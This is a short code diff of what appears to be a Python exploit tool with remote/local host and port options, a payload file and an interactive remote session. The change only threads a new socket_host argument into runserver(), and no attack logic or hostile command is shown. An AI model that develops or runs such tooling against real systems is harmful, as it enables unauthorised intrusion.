@@ -152,7 +152,7 @@ def interact(remote):
         return
 
 
-def runserver(rhost, rport, lhost, lport):
+def runserver(rhost, rport, lhost, lport, socket_host):
     print("[*] Listening on {}:{}".format(lhost, lport))
     # expolit
     expfile = os.path.basename(filename)
@@ -220,7 +220,7 @@ def main():
         exit(0)
     payload = open(filename, "rb").read()
     try:
-        runserver(options.rhost, options.rport, options.lhost, options.lport)
+        runserver(options.rhost, options.rport, options.lhost, options.lport, options.socket_host)
     except Exception as e:
         print("\033[1;31;m[-]\033[0m Error :{}, exit..".format(e))
 
